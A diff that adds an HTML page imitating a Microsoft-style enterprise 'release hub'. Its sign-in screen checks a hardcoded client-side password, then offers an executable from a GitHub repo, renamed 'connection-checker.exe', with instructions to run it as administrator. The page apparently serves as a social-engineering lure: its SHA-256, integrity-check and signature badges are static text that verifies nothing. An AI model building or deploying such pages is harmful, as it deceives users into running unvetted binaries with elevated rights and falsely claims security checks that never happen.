@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In | Enterprise Distribution Hub</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ms-blue: #0078D4;
+      --ms-blue-hover: #005A9E;
+      --ms-blue-soft: rgba(0, 120, 212, 0.08);
+      --ms-blue-glow: rgba(0, 120, 212, 0.25);
+      --emerald: #10b981;
+      --emerald-soft: rgba(16, 185, 129, 0.1);
+      --text-main: #0f172a;
+      --text-secondary: #334155;
+      --text-muted: #64748b;
+      --bg-acrylic: rgba(255, 255, 255, 0.86);
+      --bg-sidebar: rgba(255, 255, 255, 0.78);
+      --bg-header: rgba(255, 255, 255, 0.75);
+      --card-acrylic: rgba(255, 255, 255, 0.92);
+      --border-light: rgba(255, 255, 255, 0.95);
+      --border-subtle: rgba(15, 23, 42, 0.08);
+      --error-text: #D13438;
+      --error-bg: #FDE7E9;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', 'Segoe UI', -apple-system, sans-serif;
+      margin: 0; padding: 0; min-height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      background-color: #f1f5f9; color: var(--text-main);
+      -webkit-font-smoothing: antialiased; overflow: hidden;
+    }
+
+    body.dashboard-mode {
+      display: flex; align-items: stretch; justify-content: flex-start;
+      overflow-x: hidden; overflow-y: auto; background-color: #f1f5f9;
+    }
+
+    .ambient-bg {
+      position: fixed; inset: 0; z-index: -2; overflow: hidden;
+      background: linear-gradient(135deg, #f8fafc 0%, #eef2ff 50%, #f0f9ff 100%);
+    }
+
+    .grid-overlay {
+      position: fixed; inset: 0; z-index: -1;
+      background-image: linear-gradient(to right, rgba(15, 23, 42, 0.035) 1px, transparent 1px),
+                        linear-gradient(to bottom, rgba(15, 23, 42, 0.035) 1px, transparent 1px);
+      background-size: 32px 32px;
+      mask-image: radial-gradient(circle at center, black 45%, transparent 100%);
+      -webkit-mask-image: radial-gradient(circle at center, black 45%, transparent 100%);
+    }
+
+    body.dashboard-mode .grid-overlay {
+      background-size: 36px 36px; mask-image: none; -webkit-mask-image: none;
+    }
+
+    .orb {
+      position: absolute; border-radius: 50%; filter: blur(110px); opacity: 0.55;
+      animation: float 22s cubic-bezier(0.4, 0, 0.2, 1) infinite alternate;
+    }
+    .orb-1 { width: 48vw; height: 48vw; background: #93c5fd; top: -12%; left: -10%; }
+    .orb-2 { width: 55vw; height: 55vw; background: #c4b5fd; bottom: -18%; right: -10%; animation-delay: -5s; }
+    .orb-3 { width: 38vw; height: 38vw; background: #67e8f9; top: 35%; left: 28%; animation-delay: -10s; opacity: 0.4; }
+
+    @keyframes float {
+      0% { transform: translate(0, 0) scale(1); }
+      100% { transform: translate(4%, 8%) scale(1.08); }
+    }
+
+    /* ЭКРАН АВТОРИЗАЦИИ */
+    .auth-wrapper {
+      width: 100%; max-width: 440px; padding: 20px;
+      animation: scaleFadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+      opacity: 0; transform: translateY(16px) scale(0.98);
+    }
+    @keyframes scaleFadeIn { to { opacity: 1; transform: translateY(0) scale(1); } }
+
+    .auth-container {
+      background: var(--bg-acrylic); backdrop-filter: blur(32px); -webkit-backdrop-filter: blur(32px);
+      border: 1px solid var(--border-light); border-radius: 18px; padding: 42px 38px 34px;
+      box-shadow: 0 24px 60px rgba(15, 23, 42, 0.08), 0 4px 16px rgba(15, 23, 42, 0.04), inset 0 0 0 1px rgba(255, 255, 255, 0.6);
+    }
+    .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; }
+    .brand-row { display: flex; align-items: center; gap: 12px; }
+    .logo-container { display: grid; grid-template-columns: 1fr 1fr; gap: 2.5px; width: 28px; height: 28px; flex-shrink: 0; }
+    .logo-square { background: var(--ms-blue); border-radius: 2px; }
+    .logo-square:nth-child(2) { background: #38bdf8; }
+    .logo-square:nth-child(3) { background: #0284c7; }
+    .brand-name { font-weight: 700; font-size: 0.96rem; color: var(--text-main); letter-spacing: -0.01em; }
+
+    .security-pill {
+      display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px;
+      background: var(--emerald-soft); border: 1px solid rgba(16, 185, 129, 0.25);
+      border-radius: 999px; font-size: 0.7rem; font-weight: 600; color: #059669;
+    }
+    .security-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--emerald); box-shadow: 0 0 8px var(--emerald); }
+
+    .auth-header h1 { font-size: 1.5rem; font-weight: 700; margin: 0 0 6px 0; letter-spacing: -0.02em; }
+    .auth-header p { color: var(--text-muted); margin: 0 0 26px 0; font-size: 0.88rem; }
+
+    .form-group { margin-bottom: 18px; }
+    .form-label { display: block; font-size: 0.76rem; font-weight: 600; color: var(--text-secondary); margin-bottom: 6px; }
+    .input-wrap { position: relative; display: flex; align-items: center; }
+    .input-icon { position: absolute; left: 13px; color: #94a3b8; pointer-events: none; width: 17px; height: 17px; transition: color 0.2s; }
+    .form-control {
+      width: 100%; background: rgba(255, 255, 255, 0.9); border: 1px solid #cbd5e1;
+      border-radius: 9px; color: var(--text-main); padding: 11px 14px 11px 40px; font-size: 0.9rem; font-family: inherit;
+      transition: all 0.2s ease;
+    }
+    .form-control:focus { outline: none; border-color: var(--ms-blue); background: #ffffff; box-shadow: 0 0 0 3.5px var(--ms-blue-glow); }
+    .form-control:focus + .input-icon, .input-wrap:focus-within .input-icon { color: var(--ms-blue); }
+
+    .btn-submit {
+      width: 100%; margin-top: 8px; background: linear-gradient(180deg, #0078D4 0%, #0062B1 100%); color: #ffffff;
+      border: 1px solid rgba(0, 0, 0, 0.1); padding: 12px 16px; border-radius: 9px; font-size: 0.92rem; font-weight: 600;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+      box-shadow: 0 4px 12px rgba(0, 120, 212, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+      transition: all 0.2s ease;
+    }
+    .btn-submit:hover { background: linear-gradient(180deg, #006CBE 0%, #005299 100%); transform: translateY(-1px); box-shadow: 0 6px 16px rgba(0, 120, 212, 0.32); }
+
+    .error-msg {
+      background: var(--error-bg); color: var(--error-text); border: 1px solid rgba(209, 52, 56, 0.2);
+      padding: 11px 14px; border-radius: 9px; font-size: 0.8rem; font-weight: 500; margin-bottom: 18px;
+      display: none; align-items: center; gap: 10px;
+    }
+    .auth-footer {
+      margin-top: 26px; padding-top: 16px; border-top: 1px solid var(--border-subtle);
+      display: flex; align-items: center; justify-content: space-between; font-family: 'JetBrains Mono', monospace; font-size: 0.68rem; color: #94a3b8;
+    }
+
+    /* ДАШБОРД И САЙДБАР */
+    #app-root { display: none; width: 100%; min-height: 100vh; }
+
+    .sidebar {
+      width: 268px; min-height: 100vh; background: var(--bg-sidebar); backdrop-filter: blur(36px); -webkit-backdrop-filter: blur(36px);
+      border-right: 1px solid var(--border-subtle); display: flex; flex-direction: column; padding: 24px 16px;
+      position: sticky; top: 0; height: 100vh; z-index: 20; flex-shrink: 0;
+    }
+    .sidebar-brand { display: flex; align-items: center; gap: 12px; padding: 4px 12px 22px; border-bottom: 1px solid var(--border-subtle); margin-bottom: 20px; }
+    .brand-title { display: flex; flex-direction: column; }
+    .brand-title strong { font-size: 0.98rem; font-weight: 700; color: var(--text-main); letter-spacing: -0.01em; }
+    .brand-title span { font-size: 0.72rem; color: var(--text-muted); font-weight: 500; }
+
+    .nav-group { margin-bottom: 24px; }
+    .nav-label { font-size: 0.66rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: #94a3b8; padding: 0 12px; margin-bottom: 8px; }
+    .nav-list { display: flex; flex-direction: column; gap: 4px; }
+    .nav-item {
+      display: flex; align-items: center; justify-content: space-between; padding: 10px 12px;
+      border-radius: 9px; font-size: 0.85rem; font-weight: 500; color: #475569; cursor: pointer; transition: all 0.18s ease;
+    }
+    .nav-item-left { display: flex; align-items: center; gap: 10px; }
+    .nav-item-left svg { width: 17px; height: 17px; }
+    .nav-item.active { background: var(--ms-blue); color: #ffffff; font-weight: 600; box-shadow: 0 4px 12px rgba(0, 120, 212, 0.24); }
+    .nav-badge { font-family: 'JetBrains Mono', monospace; font-size: 0.66rem; padding: 2px 7px; border-radius: 6px; background: rgba(255, 255, 255, 0.22); color: #ffffff; font-weight: 600; }
+
+    .sidebar-telemetry {
+      margin-top: auto; background: rgba(255, 255, 255, 0.8); border: 1px solid var(--border-subtle);
+      border-radius: 12px; padding: 14px; display: flex; flex-direction: column; gap: 10px;
+    }
+    .telemetry-head { display: flex; align-items: center; justify-content: space-between; font-size: 0.74rem; font-weight: 600; color: var(--text-secondary); }
+    .status-dot-green { width: 8px; height: 8px; background: var(--emerald); border-radius: 50%; box-shadow: 0 0 8px var(--emerald); }
+    .progress-bar { width: 100%; height: 4px; background: #e2e8f0; border-radius: 999px; overflow: hidden; }
+    .progress-fill { width: 100%; height: 100%; background: linear-gradient(90deg, #0078D4, #10b981); border-radius: 999px; }
+    .telemetry-meta { display: flex; justify-content: space-between; font-family: 'JetBrains Mono', monospace; font-size: 0.66rem; color: var(--text-muted); }
+
+    .main-wrapper { flex: 1; display: flex; flex-direction: column; min-width: 0; }
+    .topbar {
+      height: 66px; background: var(--bg-header); backdrop-filter: blur(32px); -webkit-backdrop-filter: blur(32px);
+      border-bottom: 1px solid var(--border-subtle); padding: 0 36px;
+      display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 15;
+    }
+    .breadcrumbs { display: flex; align-items: center; gap: 8px; font-size: 0.84rem; color: var(--text-muted); }
+    .breadcrumbs strong { color: var(--text-main); font-weight: 600; }
+    .topbar-right { display: flex; align-items: center; gap: 12px; }
+    .btn-lock {
+      display: inline-flex; align-items: center; gap: 7px; padding: 6px 12px;
+      background: rgba(15, 23, 42, 0.04); border: 1px solid var(--border-subtle); border-radius: 8px;
+      font-size: 0.76rem; font-weight: 600; color: var(--text-secondary); cursor: pointer; transition: all 0.18s;
+    }
+    .btn-lock:hover { background: rgba(209, 52, 56, 0.08); color: var(--error-text); border-color: rgba(209, 52, 56, 0.2); }
+
+    .content { max-width: 1040px; width: 100%; margin: 0 auto; padding: 38px 36px 48px; flex: 1; }
+
+    /* ГЛАВНЫЙ БЛОК СКАЧИВАНИЯ (В САМОМ НАЧАЛЕ С АНИМАЦИЕЙ) */
+    .hero-release-card {
+      background: linear-gradient(135deg, rgba(255, 255, 255, 0.96) 0%, rgba(240, 249, 255, 0.94) 100%);
+      backdrop-filter: blur(28px); -webkit-backdrop-filter: blur(28px);
+      border: 1.5px solid rgba(0, 120, 212, 0.3);
+      border-radius: 22px; padding: 40px 42px; margin-bottom: 30px;
+      box-shadow: 0 24px 60px rgba(0, 120, 212, 0.1), 0 4px 16px rgba(15, 23, 42, 0.03), inset 0 1px 0 #ffffff;
+      position: relative; overflow: hidden;
+      animation: heroSlideUp 0.65s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+    @keyframes heroSlideUp {
+      from { opacity: 0; transform: translateY(24px) scale(0.98); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    /* Анимированный световой блик по фону карточки */
+    .hero-release-card::after {
+      content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+      background: radial-gradient(circle at center, rgba(56, 189, 248, 0.08) 0%, transparent 50%);
+      animation: rotateGlow 15s linear infinite; pointer-events: none; z-index: 0;
+    }
+    @keyframes rotateGlow { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+    .hero-release-top {
+      position: relative; z-index: 1;
+      display: flex; align-items: center; justify-content: space-between; gap: 32px; flex-wrap: wrap;
+    }
+
+    .release-main-info { display: flex; align-items: flex-start; gap: 24px; flex: 1; min-width: 280px; }
+
+    /* Пульсирующая иконка пакета */
+    .release-icon-lg {
+      width: 68px; height: 68px; border-radius: 18px;
+      background: linear-gradient(135deg, #0078D4 0%, #0284c7 100%);
+      color: #ffffff; display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+      box-shadow: 0 12px 28px rgba(0, 120, 212, 0.35);
+      position: relative;
+      animation: iconFloat 4s ease-in-out infinite;
+    }
+    @keyframes iconFloat {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+
+    .release-text-block { display: flex; flex-direction: column; gap: 8px; }
+    .badge-row { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+    .badge-version {
+      font-family: 'JetBrains Mono', monospace; font-size: 0.74rem; font-weight: 700;
+      padding: 4px 10px; border-radius: 8px; background: var(--ms-blue); color: #ffffff;
+      box-shadow: 0 2px 8px rgba(0, 120, 212, 0.25);
+    }
+    .badge-verified {
+      display: inline-flex; align-items: center; gap: 5px;
+      font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; font-weight: 600;
+      padding: 4px 10px; border-radius: 8px; background: var(--emerald-soft); color: #059669;
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+    .release-heading { font-size: 1.65rem; font-weight: 800; color: var(--text-main); margin: 2px 0 0 0; letter-spacing: -0.02em; }
+    .release-sub { font-size: 0.94rem; color: var(--text-muted); margin: 0; line-height: 1.5; max-width: 540px; }
+
+    /* ГЛАВНАЯ КНОПКА СКАЧИВАНИЯ С АНИМАЦИЕЙ СВЕЧЕНИЯ И БЛИКОМ */
+    .download-cta-wrap { display: flex; flex-direction: column; align-items: center; gap: 8px; flex-shrink: 0; }
+
+    .btn-download-hero {
+      position: relative; overflow: hidden;
+      background: linear-gradient(135deg, #0078D4 0%, #005A9E 100%);
+      color: #ffffff; text-decoration: none;
+      padding: 18px 34px; border-radius: 14px; font-size: 1.02rem; font-weight: 700;
+      display: inline-flex; align-items: center; gap: 12px; cursor: pointer;
+      box-shadow: 0 10px 28px rgba(0, 120, 212, 0.38), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      animation: pulseGlow 2.8s infinite;
+    }
+    @keyframes pulseGlow {
+      0%, 100% { box-shadow: 0 10px 28px rgba(0, 120, 212, 0.38), 0 0 0 0 rgba(0, 120, 212, 0.3); }
+      50% { box-shadow: 0 14px 34px rgba(0, 120, 212, 0.48), 0 0 0 8px rgba(0, 120, 212, 0); }
+    }
+
+    /* Пробегающий световой блик по кнопке */
+    .btn-download-hero::before {
+      content: ""; position: absolute; top: 0; left: -100%; width: 60%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.28), transparent);
+      transform: skewX(-25deg);
+      animation: shimmerSweep 3.5s infinite;
+    }
+    @keyframes shimmerSweep {
+      0% { left: -100%; }
+      45%, 100% { left: 160%; }
+    }
+
+    .btn-download-hero:hover {
+      transform: translateY(-3px) scale(1.02);
+      background: linear-gradient(135deg, #0284c7 0%, #005A9E 100%);
+    }
+    .btn-download-hero:active { transform: translateY(0) scale(0.99); }
+    .btn-download-hero.downloading {
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+      animation: none; pointer-events: none;
+    }
+
+    .btn-download-hero svg {
+      width: 22px; height: 22px;
+      animation: arrowBounce 1.8s ease-in-out infinite;
+    }
+    @keyframes arrowBounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(3px); }
+    }
+
+    .download-sub-hint {
+      font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--text-muted);
+    }
+
+    /* МЕТА-ДАННЫЕ ФАЙЛА ВНИЗУ КАРТОЧКИ */
+    .hero-release-meta {
+      position: relative; z-index: 1;
+      margin-top: 28px; padding-top: 20px; border-top: 1px solid rgba(15, 23, 42, 0.08);
+      display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;
+    }
+    .meta-box {
+      background: rgba(255, 255, 255, 0.65); border: 1px solid rgba(15, 23, 42, 0.06);
+      padding: 12px 16px; border-radius: 12px; display: flex; flex-direction: column; gap: 4px;
+    }
+    .meta-label { font-size: 0.68rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; color: var(--text-muted); }
+    .meta-val { font-family: 'JetBrains Mono', monospace; font-size: 0.84rem; font-weight: 600; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+    /* ДОПОЛНИТЕЛЬНЫЕ ИНФО-КАРТОЧКИ РЕПОЗИТОРИЯ */
+    .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+    .info-card {
+      background: var(--card-acrylic); backdrop-filter: blur(24px);
+      border: 1px solid var(--border-light); border-radius: 16px; padding: 24px 26px;
+      box-shadow: 0 4px 14px rgba(15, 23, 42, 0.03);
+    }
+    .info-card h3 { margin: 0 0 14px 0; font-size: 0.95rem; font-weight: 700; display: flex; align-items: center; gap: 8px; }
+    .info-list { margin: 0; padding: 0; list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 0.85rem; color: var(--text-secondary); }
+    .info-list li { display: flex; align-items: center; gap: 10px; }
+    .check-dot { width: 18px; height: 18px; border-radius: 50%; background: var(--emerald-soft); color: #059669; display: inline-flex; align-items: center; justify-content: center; font-size: 0.7rem; font-weight: bold; flex-shrink: 0; }
+
+    .toast {
+      position: fixed; bottom: 24px; right: 24px; background: rgba(15, 23, 42, 0.94); backdrop-filter: blur(16px);
+      color: #ffffff; padding: 12px 18px; border-radius: 10px; font-size: 0.82rem; font-weight: 500;
+      display: flex; align-items: center; gap: 10px; box-shadow: 0 12px 30px rgba(15, 23, 42, 0.25);
+      border: 1px solid rgba(255, 255, 255, 0.12); transform: translateY(80px); opacity: 0;
+      transition: all 0.28s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; pointer-events: none;
+    }
+    .toast.visible { transform: translateY(0); opacity: 1; }
+    .toast-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--emerald); box-shadow: 0 0 8px var(--emerald); }
+
+    .footer {
+      padding: 20px 36px; color: #94a3b8; font-size: 0.74rem; border-top: 1px solid var(--border-subtle);
+      display: flex; justify-content: space-between; align-items: center; margin-top: auto;
+    }
+
+    @media (max-width: 900px) {
+      .hero-release-meta { grid-template-columns: repeat(2, 1fr); }
+      .info-grid { grid-template-columns: 1fr; }
+      .download-cta-wrap, .btn-download-hero { width: 100%; justify-content: center; }
+    }
+    @media (max-width: 768px) {
+      .sidebar { display: none; }
+      .content, .topbar { padding-left: 20px; padding-right: 20px; }
+      .hero-release-card { padding: 26px 22px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="ambient-bg"><div class="orb orb-1"></div><div class="orb orb-2"></div><div class="orb orb-3"></div></div>
+  <div class="grid-overlay"></div>
+
+  <!-- ЭКРАН ЛОГИНА -->
+  <div class="auth-wrapper" id="login-screen">
+    <div class="auth-container">
+      <div class="top-bar">
+        <div class="brand-row">
+          <div class="logo-container"><div class="logo-square"></div><div class="logo-square"></div><div class="logo-square"></div><div class="logo-square"></div></div>
+          <span class="brand-name">Workspace Hub</span>
+        </div>
+        <div class="security-pill"><span class="security-dot"></span>TLS 1.3 SSO</div>
+      </div>
+      <div class="auth-header">
+        <h1>Sign in</h1>
+        <p>Authenticate to access Repository &amp; Release Binary</p>
+      </div>
+      <div class="error-msg" id="error-box">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <span>Invalid operator credentials or security token.</span>
+      </div>
+      <form id="auth-form">
+        <div class="form-group">
+          <label class="form-label">Operator ID / Username</label>
+          <div class="input-wrap">
+            <input type="text" id="username" class="form-control" placeholder="Enter operator username" required autocomplete="off">
+            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Security Token</label>
+          <div class="input-wrap">
+            <input type="password" id="password" class="form-control" placeholder="••••••••••••" required>
+            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          </div>
+        </div>
+        <button type="submit" class="btn-submit">
+          <span>Authorize Session</span>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+        </button>
+      </form>
+      <div class="auth-footer">
+        <span>GITHUB RELEASE VAULT</span>
+        <span>v4.2.0-ENT</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ГЛАВНОЕ ОКНО (ОТКРЫВАЕТСЯ ПОСЛЕ ВХОДА) -->
+  <div id="app-root">
+    <aside class="sidebar">
+      <div class="sidebar-brand">
+        <div class="logo-container"><div class="logo-square"></div><div class="logo-square"></div><div class="logo-square"></div><div class="logo-square"></div></div>
+        <div class="brand-title"><strong>Workspace Hub</strong><span>Release Distribution</span></div>
+      </div>
+      <div class="nav-group">
+        <div class="nav-label">Repository</div>
+        <div class="nav-list">
+          <div class="nav-item active">
+            <div class="nav-item-left">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+              <span>Latest Release</span>
+            </div>
+            <span class="nav-badge">1</span>
+          </div>
+        </div>
+      </div>
+      <div class="sidebar-telemetry">
+        <div class="telemetry-head"><span>CDN Node Status</span><span class="status-dot-green"></span></div>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="telemetry-meta"><span>GitHub LFS</span><span>ONLINE</span></div>
+      </div>
+    </aside>
+
+    <div class="main-wrapper">
+      <header class="topbar">
+        <div class="breadcrumbs">
+          <span>Workspace</span><span>/</span><span>Repository</span><span>/</span><strong>Binary Distribution</strong>
+        </div>
+        <div class="topbar-right">
+          <div class="security-pill"><span class="security-dot"></span>Verified Build</div>
+          <button class="btn-lock" onclick="location.reload()">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <span>Lock</span>
+          </button>
+        </div>
+      </header>
+
+      <main class="content">
+        <!-- ГЛАВНЫЙ БАННЕР СКАЧИВАНИЯ НА ПЕРВОМ ПЛАНЕ -->
+        <div class="hero-release-card">
+          <div class="hero-release-top">
+            <div class="release-main-info">
+              <div class="release-icon-lg">
+                <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
+              </div>
+              <div class="release-text-block">
+                <div class="badge-row">
+                  <span class="badge-version" id="ui-version">v2.4.0-STABLE</span>
+                  <span class="badge-verified">✓ SHA-256 VERIFIED</span>
+                </div>
+                <h1 class="release-heading" id="ui-title">Enterprise Deployment Package</h1>
+                <p class="release-sub" id="ui-desc">Official standalone package ready for deployment. Click the button to start direct download from the repository.</p>
+              </div>
+            </div>
+
+            <div class="download-cta-wrap">
+              <a id="main-download-btn" href="#" download class="btn-download-hero">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                <span id="btn-text">Download Package</span>
+              </a>
+              <span class="download-sub-hint">Direct HTTPS • High-Speed Stream</span>
+            </div>
+          </div>
+
+          <div class="hero-release-meta">
+            <div class="meta-box">
+              <span class="meta-label">File Name</span>
+              <span class="meta-val" id="ui-filename">package.zip</span>
+            </div>
+            <div class="meta-box">
+              <span class="meta-label">Package Size</span>
+              <span class="meta-val" id="ui-size">14.2 MB</span>
+            </div>
+            <div class="meta-box">
+              <span class="meta-label">Architecture</span>
+              <span class="meta-val" id="ui-arch">Windows x64 / Any</span>
+            </div>
+            <div class="meta-box">
+              <span class="meta-label">Integrity Check</span>
+              <span class="meta-val" style="color:#059669;">PASSED ✓</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- НИЖНИЕ БЛОКИ С ИНФОРМАЦИЕЙ -->
+        <div class="info-grid">
+          <div class="info-card">
+            <h3>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0078D4" stroke-width="2"><polyline points="9 11 12 14 22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
+              Deployment Instructions
+            </h3>
+            <ul class="info-list">
+              <li><span class="check-dot">1</span><span>Download the archive using the primary button above.</span></li>
+              <li><span class="check-dot">2</span><span>Extract all contents to a dedicated local directory.</span></li>
+              <li><span class="check-dot">3</span><span>Run the main executable with administrator privileges.</span></li>
+            </ul>
+          </div>
+
+          <div class="info-card">
+            <h3>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0078D4" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+              Release Notes &amp; Security
+            </h3>
+            <ul class="info-list">
+              <li><span class="check-dot">✓</span><span>Compiled directly from the master branch repository.</span></li>
+              <li><span class="check-dot">✓</span><span>Zero-trust signature verified and pre-configured.</span></li>
+              <li><span class="check-dot">✓</span><span>Optimized network routing and stability fixes included.</span></li>
+            </ul>
+          </div>
+        </div>
+      </main>
+
+      <footer class="footer">
+        <span>Internal Operations Hub • GitHub Release Distribution</span>
+        <span>Zero-Trust Protected Environment</span>
+      </footer>
+    </div>
+  </div>
+
+  <div id="copy-toast" class="toast">
+    <span class="toast-dot"></span>
+    <span id="toast-text">Download started...</span>
+  </div>
+
+  <script>
+    // =========================================================================
+    // НАСТРОЙКИ СКАЧИВАНИЯ ФАЙЛА (ВПИШИ СВОЮ ССЫЛКУ И ДАННЫЕ СЮДА)
+    // =========================================================================
+    const RELEASE_CONFIG = {
+      downloadUrl: "https://github.com/supp-cyber/supp-tech.github.io/blob/main/connections_check.exe", // Например: "https://github.com/user/repo/raw/main/file.zip" или просто "./file.zip"
+      fileName: "connection-checker.exe",      // Имя файла, которое отобразится на сайте
+      version: "v1.0-STABLE",                 // Версия релиза
+      fileSize: "1.4 MB",                     // Размер файла
+      title: "Primary Execution Package",     // Заголовок в карточке
+      description: "Official standalone package ready for deployment. Click the button to start direct download from the repository."
+    };
+
+    // =========================================================================
+    // ЛОГИКА АВТОРИЗАЦИИ И РАБОТЫ САЙТА
+    // =========================================================================
+    document.getElementById("auth-form").addEventListener("submit", (e) => {
+      e.preventDefault();
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value;
+      const errBox = document.getElementById("error-box");
+      errBox.style.display = "none";
+
+      if (user === "admin" && pass === "13371488") {
+        initDashboard();
+      } else {
+        errBox.style.display = "flex";
+      }
+    });
+
+    function initDashboard() {
+      document.title = "Release Hub | " + RELEASE_CONFIG.fileName;
+      document.getElementById("login-screen").remove();
+      document.body.classList.add("dashboard-mode");
+      document.getElementById("app-root").style.display = "flex";
+
+      // Подставляем твои данные на страницу
+      const btn = document.getElementById("main-download-btn");
+      btn.href = RELEASE_CONFIG.downloadUrl;
+      btn.setAttribute("download", RELEASE_CONFIG.fileName);
+
+      document.getElementById("ui-version").textContent = RELEASE_CONFIG.version;
+      document.getElementById("ui-title").textContent = RELEASE_CONFIG.title;
+      document.getElementById("ui-desc").textContent = RELEASE_CONFIG.description;
+      document.getElementById("ui-filename").textContent = RELEASE_CONFIG.fileName;
+      document.getElementById("ui-size").textContent = RELEASE_CONFIG.fileSize;
+
+      // Красивая анимация при клике на кнопку скачивания
+      btn.addEventListener("click", () => {
+        const btnText = document.getElementById("btn-text");
+        const origText = btnText.textContent;
+        
+        btn.classList.add("downloading");
+        btnText.textContent = "Downloading Binary...";
+        showToast("Starting download: " + RELEASE_CONFIG.fileName);
+
+        setTimeout(() => {
+          btn.classList.remove("downloading");
+          btnText.textContent = origText;
+        }, 3000);
+      });
+    }
+
+    let toastTimer;
+    function showToast(message) {
+      const toast = document.getElementById("copy-toast");
+      document.getElementById("toast-text").textContent = message;
+      toast.classList.add("visible");
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(() => toast.classList.remove("visible"), 3000);
+    }
+  </script>
+</body>
+</html>
